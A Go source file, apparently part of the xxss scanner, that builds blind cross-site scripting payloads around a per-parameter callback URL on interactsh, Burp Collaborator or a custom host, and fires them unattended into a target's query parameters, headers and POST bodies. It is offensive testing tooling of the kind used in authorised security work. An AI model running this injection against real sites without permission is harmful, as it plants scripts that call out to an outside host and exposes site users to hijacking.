package payloads

import (
	"context"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"

	"github.com/lcalzada-xor/xxss/v2/pkg/models"
	"github.com/lcalzada-xor/xxss/v2/pkg/network"
)

// GenerateUniqueCallback creates a unique callback URL with identifier
// For interactsh/burp collaborator: uses subdomains (param123.c59h6dg.oast.fun)
// For custom URLs: uses query parameters (?id=param123)
func GenerateUniqueCallback(baseURL, identifier string) string {
	// Generate short unique hash from identifier
	hash := md5.Sum([]byte(identifier))
	paramID := hex.EncodeToString(hash[:4]) // 8 chars

	// Remove protocol for subdomain construction
	cleanURL := strings.TrimPrefix(baseURL, "https://")
	cleanURL = strings.TrimPrefix(cleanURL, "http://")

	// Check if baseURL is interactsh/collaborator compatible
	if strings.Contains(cleanURL, "oast.fun") ||
		strings.Contains(cleanURL, "interact.sh") ||
		strings.Contains(cleanURL, "burpcollaborator.net") {
		// Use subdomain: param123.c59h6dg.oast.fun
		return fmt.Sprintf("https://%s.%s", paramID, cleanURL)
	}

	// For custom URLs, use query parameter
	if strings.Contains(baseURL, "?") {
		return fmt.Sprintf("%s&id=%s", baseURL, paramID)
	}
	return fmt.Sprintf("%s?id=%s", baseURL, paramID)
}

// BlindPayloads returns an expanded list of blind XSS payloads using the callback URL
func BlindPayloads(callbackURL string) []string {
	payloads := []string{}

	// Iterate over vectors to find blind payloads
	for _, v := range Vectors {
		// Match Tags (must be blind)
		if hasTag(v.Tags, "blind") {
			// Replace Placeholder
			// Note: Time-based payloads might not have {{CALLBACK}}, which is fine
			payload := strings.ReplaceAll(v.Content, "{{CALLBACK}}", callbackURL)
			payloads = append(payloads, payload)
		}
	}

	// Append Polyglots
	payloads = append(payloads, GetPolyglots(callbackURL)...)

	return payloads
}

// BlindPayloadsForContext returns context-specific blind XSS payloads
func BlindPayloadsForContext(callbackURL string, context models.ReflectionContext) []string {
	var payloads []string

	// Iterate over vectors to find matches
	for _, v := range Vectors {
		// 1. Match Context
		if v.Context != context {
			continue
		}

		// 2. Match Tags (must be blind)
		if !hasTag(v.Tags, "blind") {
			continue
		}

		// 3. Replace Placeholder
		payload := strings.ReplaceAll(v.Content, "{{CALLBACK}}", callbackURL)
		payloads = append(payloads, payload)
	}

	// If no specific payloads found, fallback to generic ones (or if context is HTML/Unknown)
	if len(payloads) == 0 {
		return BlindPayloads(callbackURL)
	}

	return payloads
}

// InjectBlind performs a fire-and-forget injection of blind XSS payloads
func InjectBlind(client *network.Client, headers map[string]string, targetURL, param, callbackURL string, verbose bool) int {
	// Generate unique callback URL for this parameter
	uniqueURL := GenerateUniqueCallback(callbackURL, param)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] %s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
	}

	u, err := url.Parse(targetURL)
	if err != nil {
		return 0
	}

	qs := u.Query()
	injected := 0

	for _, payload := range payloads {
		qs.Set(param, payload)
		u.RawQuery = qs.Encode()

		req, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
		injected++
	}

	return injected
}

// InjectBlindHeader performs a fire-and-forget injection of blind XSS payloads into headers
func InjectBlindHeader(client *network.Client, headers map[string]string, targetURL, header, callbackURL string, verbose bool) int {
	// Generate unique callback URL for this header
	uniqueURL := GenerateUniqueCallback(callbackURL, header)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] Header:%s → %s (%d payloads)\n", header, uniqueURL, len(payloads))
	}

	injected := 0

	for _, payload := range payloads {
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set(header, payload)
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add other custom headers
		for k, v := range headers {
			if k != header {
				req.Header.Set(k, v)
			}
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
		injected++
	}

	return injected
}

// InjectBlindBody performs a fire-and-forget injection of blind XSS payloads into POST body parameters
func InjectBlindBody(client *network.Client, headers map[string]string, config *models.RequestConfig, param, callbackURL string, params map[string]string, verbose bool) int {
	// Generate unique callback URL for this parameter
	uniqueURL := GenerateUniqueCallback(callbackURL, param)
	payloads := BlindPayloads(uniqueURL)

	if verbose {
		fmt.Fprintf(os.Stderr, "[BLIND] Body:%s → %s (%d payloads)\n", param, uniqueURL, len(payloads))
	}

	injected := 0

	for _, payload := range payloads {
		// Create a copy of params with the payload
		injectedParams := make(map[string]string)
		for k, v := range params {
			injectedParams[k] = v
		}
		injectedParams[param] = payload

		// Build request body based on content type
		var body string
		var contentTypeHeader string

		if config.ContentType == "application/json" {
			// Build JSON body with proper escaping
			jsonData, err := json.Marshal(injectedParams)
			if err != nil {
				continue
			}
			body = string(jsonData)
			contentTypeHeader = "application/json"
		} else {
			// Build form-urlencoded body
			formData := url.Values{}
			for k, v := range injectedParams {
				formData.Set(k, v)
			}
			body = formData.Encode()
			contentTypeHeader = "application/x-www-form-urlencoded"
		}

		req, err := http.NewRequest(string(config.Method), config.URL, nil)
		if err != nil {
			continue
		}

		// Set body
		req.Body = http.NoBody
		if body != "" {
			req.Body = http.NoBody // Will be set by client
			req.Header.Set("Content-Type", contentTypeHeader)
			req.ContentLength = int64(len(body))
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add custom headers
		for k, v := range headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup and timeout)
		go func(bodyStr string) {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			req2, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, strings.NewReader(bodyStr))
			if err != nil {
				return
			}
			req2.Header = req.Header.Clone()
			resp, err := client.Do(req2)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(body)
		injected++
	}

	return injected
}
